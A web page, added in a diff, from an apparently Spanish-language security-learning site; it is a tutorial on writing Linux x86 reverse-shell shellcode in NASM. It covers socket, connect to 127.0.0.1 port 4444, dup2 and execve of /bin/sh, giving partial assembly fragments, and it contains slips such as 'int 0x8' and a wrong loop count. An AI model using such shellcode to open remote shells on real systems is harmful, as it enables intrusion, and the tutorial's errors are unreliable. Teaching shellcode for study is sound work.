@@ -1,0 +1,365 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
+
+
+       
+	<title>Shellcode</title>
+</head>
+<body class="d-flex flex-column h-100">
+
+<header>
+
+   <nav class="navbar navbar-expand-md bg-white fixed-top navbar-light shadow-sm">
+    <div class="container-fluid">
+      <a class="navbar-brand text-primary" href="https://bgpavelang.github.io">learn@hacks#</a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse justify-content-md-center" id="navbarCollapse">
+        <ul class="navbar-nav">
+          <li class="nav-item active"><a class="nav-link text-primary" href="https://bgpavelang.github.io">HOME</a></li>
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle nav-link text-primary" href="#" data-bs-toggle="dropdown">Exploit Education</a>
+            <ul class="dropdown-menu">
+              <li><a class="dropdown-item nav-link text-primary" href="proofExEducation.html">Phoenix</a></li>
+              <li><a class="dropdown-item nav-link text-primary" href="proofNbEducation.html">Nebula</a></li>
+              <li><a class="dropdown-item nav-link text-primary" href="proofFsEducation.html">Fusion</a></li>
+            </ul>
+           
+          </li>
+
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle nav-link text-primary" href="#" data-bs-toggle="dropdown">CTFs</a>
+            <ul class="dropdown-menu">
+            	<li><a class="dropdown-item nav-link text-primary" href="proofVlhub.html">Vulnhub</a></li>
+            </ul>
+
+           <li class="nav-item dropdown">
+            <a class="dropdown-toggle nav-link text-primary" href="#" data-bs-toggle="dropdown">Shellcode</a>
+             <ul class="dropdown-menu">
+               <li><a class="nav-link text-primary" href="shells.html">Shellcode</a></li>
+             <li><a class="nav-link text-primary" href="tutorial_win32.html">Tutorial Shellcode Win32(proximamente)</a></li>
+             <li><a class="nav-link text-primary" href="tutorial_win64.html">Tutorial Shellcode Win64(proximamente)</a></li>
+             <li><a class="nav-link text-primary" href="tutorial_linx32.html">Tutorial Shellcode Linux86</a></li>
+             <li><a class="nav-link text-primary" href="tutorial_linx64.html">Tutorial Shellcode Linux64(proximamente)</a></li>
+               <li><a class="nav-link text-primary" href="tutorial_aarch64.html">Tutorial Shellcode aarch64(proximamente)</a></li>
+               </ul>
+             <li class="nav-item dropdown">
+            <a class=" nav-link text-primary" href="https://github.com/BGPavelAng">Github</a></i>
+             <li class="nav-item dropdown">
+            <a class=" nav-link text-primary" href="https://www.patreon.com/bePatron?u=65257866">Patreon</a></i>
+        </li>
+          </li>
+        </ul>
+        
+      </div>
+    </div>
+  </nav>
+</header>
+
+  <div class="container mt-5">
+    <div class="row mt-5">
+      <div class="col">
+
+            <p>Una pequeña explicación de como realizar una shell para linux_.</p>
+
+<p>Veamos unos conceptos básicos, está explicación es realizado en nasm, esta forma no es única, hay varias formas, todo depende de tu imaginación y de como te atrevas a programarlo.</p>
+
+<p>Explicaré una formas básicas de una shell pequeña, lo demás es bajo tu creatividad y responsabilidad.</p>
+
+<p>Algo que debes tener en cuenta para poder realizarlo, es saber manejar registros en ASM y sus ejecuciones, dejo un link a una página donde puedes aprender más.</p>
+
+<a href="https://www.aldeid.com/wiki/Category:Architecture/x86-assembly">Architecture/x86-assembly</a><br><br>
+
+Conceptos básicos.
+
+
+    <table style="font-family: &quot;Times New Roman&quot;;
+      letter-spacing: normal; orphans: 2; text-indent: 0px;
+      text-transform: none; widows: 2; word-spacing: 0px;
+      -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+      text-decoration-color: initial;" cellspacing="2" cellpadding="2"
+      border="1">
+      
+        <tr>
+          <td valign="top"><br>
+          </td>
+          <td colspan="4" rowspan="1" valign="top" align="center">Registros<br>
+          </td>
+          <td valign="top"><br>
+          </td>
+        </tr>
+        <tr>
+          <td valign="top"><br>
+          </td>
+          <td valign="top">64 bit<br>
+          </td>
+          <td valign="top">32 bit<br>
+          </td>
+          <td valign="top"><b>Explicación</b><br>
+          </td>
+        </tr>
+        <tr>
+          <td valign="top">64 bit<br>
+          </td>
+          <td valign="top">rax, rbx, rcx, rdx, rsi, rdi<br>
+          </td>
+          <td valign="top">---<br>
+          </td>
+          <td valign="top"><a>Los registros a utilizar son rsi, rdi, rcx, rdx, r8 - r11, etc.<br>
+          </td>
+        </tr>
+        <tr>
+          <td valign="top">32 bit<br>
+          </td>
+          <td valign="top">---<br>
+          </td>
+          <td valign="top">eax, ebx, ecx, edx, esi, edi<br>
+          </td>
+          <td valign="top">Los registros a utilizar son ebx, edx, ecx, edx, esi, edi, etc.<br>
+          </td>
+        </tr>
+
+    </table>
+    <br>
+    
+    Tipo de datos<br>
+    <table style="font-family: &quot;Times New Roman&quot;;
+      letter-spacing: normal; orphans: 2; text-indent: 0px;
+      text-transform: none; widows: 2; word-spacing: 0px;
+      -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+      text-decoration-color: initial;" cellspacing="2" cellpadding="2"
+      border="1">
+      
+        <tr>
+          <td align="right"><strong>Memoria</strong></td>
+          <td><strong>Bits</strong></td>
+          <td><strong>Bytes</strong></td>
+          <td><strong>Registro</strong></td>
+          <td><strong>Access-Memory</strong></td>
+          <td><strong>Allocate-Memory</strong></td>
+        </tr>
+        <tr>
+          <td>char</td>
+          <td>8</td>
+          <td>1</td>
+          <td>al</td>
+          <td>BYTE [ptr]</td>
+          <td>db</td>
+        </tr>
+        <tr>
+          <td>short</td>
+          <td>16</td>
+          <td>2</td>
+          <td>ax</td>
+          <td>WORD [ptr]</td>
+          <td>dw</td>
+        </tr>
+        <tr>
+          <td>int</td>
+          <td>32</td>
+          <td>4</td>
+          <td>eax</td>
+          <td>DWORD [ptr]</td>
+          <td>dd</td>
+        </tr>
+        <tr>
+          <td>long</td>
+          <td>64</td>
+          <td>8</td>
+          <td>rax</td>
+          <td>QWORD [ptr]</td>
+          <td>dq</td>
+        </tr>
+    </table><br>
+
+ <p>Para compilar: nasm -felf32 .nasm<br>
+ld -m elf_i386 .o -o</p>
+
+<p>Primero que todo tenemos que avisarle al sistema que vamos a usar socket, así que hay que hace un call para poder iniciar.</p>
+<p>Antes que nada, es bueno que busques esta información en el codigo fuente de linux, por lo general se encuentran en:</p>
+<p><b>/usr/include/asm/unistd_32.h</p>
+<p>/usr/include/linux/net.h</p>
+<p>Vamos a necesitar varios.</p>
+<p>#define __NR_socketcall 102</p>
+<p>#define SYS_CONNECT  3 </p>
+<p>#define __NR_dup2 63</p>
+<p>#define __NR_execve 11</p>
+<p>#define SYS_SOCKET  1</p></b>
+<p>Los syscall en linux son int 0x8</p>
+
+<p>Así que debemos poner <b>mov al, 102</b> </p>
+
+<pre class="brush: cpp; title: ; notranslate" title=""><b>int socket(int domain, int type, int protocol)</b></pre>
+
+<p>En seguida debemos usar esa funcion.</p>
+
+Tipo de datos<br>
+    <table style="font-family: &quot;Times New Roman&quot;;
+      letter-spacing: normal; orphans: 2; text-indent: 0px;
+      text-transform: none; widows: 2; word-spacing: 0px;
+      -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+      text-decoration-color: initial;" cellspacing="2" cellpadding="2"
+      border="1">
+      
+        <tr>
+          <td align="right"><strong>Domain</strong></td>
+          <td align="center"><strong>Type</strong></td>
+          <td align="left"><strong>Protocol</strong></td>
+        </tr>
+        <tr>
+          <td>AF_INET |</td>
+          <td>SOCK_STREAM |</td>
+          <td>IPPROTO_IP</td>
+        </tr>
+        <tr>
+          <td align="right">2 |</td>
+          <td align="right">1 |</td>
+          <td align="right">0</td>
+        </tr>
+    </table><br>
+
+<p>Con eso podemos entender que necesitamos, solo hay que meter en cada registro el dato necesario.</p>
+
+<p>Pero antes debemos saber como meter todo esos datos. La mejor opción es meter todo a la pila, para eso sirven los push.</p>
+
+<p><b>xor esi, esi<br>
+  inc esi = 1<br>
+push esi<br>
+pop ebx = 0x1<br>
+(socket)<br><br>
+xor esi, esi<br>
+push esi = 0x0<br>
+inc esi = 0x1<br>
+push esi<br>
+inc esi = 0x2<br>
+push esi<br>
+(2,1,0)<br><br>
+
+mov ecx, esp<br></b></p>
+
+<p><b>Opcional</b></p>
+
+<p>Puede colocar a edx en null, para no permitir una interrupción</p>
+
+<p><b>xor edx, edx</b></p>
+
+<p>¿Cómo quedaría entonces?</p>
+
+<p><b>
+eax = socketcall<br>
+ebx = 1, SYS_SOCKET<br>
+ecx = (2,1,0), (AF_INET, SOCK_STREAM, IPPROTO_IP)<br>
+edx = 0<br>
+int 0x80<br><br></b>
+
+<img class="img-fluid" src="img/tuto_lnx32.png"><br><br>
+
+<p>Repetimos lo mismo ahora para darle indicaciones a connect</p>
+
+<pre class="brush: cpp; title: ; notranslate" title=""><b>int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</b></pre>
+
+<p>La respuesta del sistema siempre se guarda en <b>eax</b>, así que solo habrá que hacer un cambio con <b>xchg</b>, así que pare no complicarnos la vida lo hacemos directamente con el registro que lo va a usar, <b>edx</b>.</p>
+
+<p><b>xchg edx, eax</b></p>
+
+<p>Repetimos la mismo que arriba segun la estructura sockaddr_in.</p>
+<pre class="brush: cpp; title: ; notranslate" title=""><b>;struct sockaddr_in {
+;  __kernel_sa_family_t  sin_family;     /* Address family               */
+;  __be16                sin_port;       /* Port number                  */
+;  struct in_addr        sin_addr;       /* Internet address             */
+;};</b></pre>
+
+<p>Veamos como quedaría-</p>
+
+<p><b>
+push 0x0100007f = 127.0.0.1<br>
+push word 0x5c11 = 4444<br>
+push word 0x2 = AF_INET</b><br><br>
+
+volvemos a repetir<br><br>
+
+<b>mov ecx, esp = sockaddr_in<br>
+push 0x10 (size of struct)<br>
+push ecx <br>
+push edx = socket</b><br><br>
+
+una vez más, pero ya para definir connect<br><br>
+
+<b>eax, 102 = syscall<br>
+mov bl, 0x3 = connect<br>
+mov ecx, esp = toda la estructira de arriba</b><br><br>
+
+<p>Ya tenemos lista la conexión, pero falta como crear una tubería para mandar y recibir datos. Para eso usaremos <b>dup2(2)</b>.</p>
+
+<p><b>stdin(0)<br>
+stdout(1)<br>
+stderr(2)</b><br></p>
+
+<p>Esta parte ya es más sencillo, así que se que pueden resolverlo.</p>
+
+<p>Veamos que se debe hacer.</p>
+
+<p>Tiene que invocar a dup2 en <b>eax</b>, <b>ecx</b> se usa para loops o ciclos de repetición</p>
+
+<p>Para hacer ciclos de repetición, tienes que hacer uso de jumps (jne, jz)</p>
+
+<p>Por ejemplo:</p>
+<p><b>mov ecx, 0x3<br>
+  salto:<br>
+  dec ecx<br>
+jnz salto</b><br></p>
+
+<p>Aquí va repetirse 4 veces, porque es 0-3 = 4</p>
+
+<p>Si ya entendieron el concepto, esto es muy sencillo.</p>
+
+<p>Ahora hay que repetir la formula de arriba para pushear <b>bash</b>.</p>
+
+<p><b>/bin/sh0.. </b>Es muy importante el null al final, para que el sistema entienda que ahpi termina la cadena de caracteres y se detenga
+</p><br>
+
+<p><b>Recuerda que se debe poner al reves por el sistema "Endianness"</b>
+</p><br>
+<p>Te coloco un link con la explicación detallada de que eso.</p>
+<a href="https://es.wikipedia.org/wiki/Endianness">Endiannes</a>
+
+<p>"hs//nib/" <--- Encuentra los hexadecimales.</p>
+
+<p>El proceso es el mismo, coloca en eax, <b>execv</b>, después pushea "/bin/bash", colocale un null al final.</p>
+
+<p>Parece difícil pero en realidad no lo es, observa.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title=""><b>int execve(const char *filename, char *const argv[],char *const envp[]);</b></pre>
+
+<p><b>eax = execv<br>
+  ebx = filename<br>
+ecx = argv <-- 0<br>
+edx = envp <-- 0</b><br><br></p>
+
+
+<p>Listo.</p>
+
+<p>Si deseas el código completo puede apoyarme en patreon, ahí encontraras el código y más.</p>
+<p>En github se encuentra parte del código como referencia.</p>
+
+      </div>
+
+    </div>
+  </div>
+
+  <footer class="footer mt-auto py-3 bg-light">
+  <div class="container">
+    <span class="text-muted">Aprende algo nuevo todos los días. Good luck!</span>
+  </div>
+</footer>
+
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
+
+</body>
+</html>
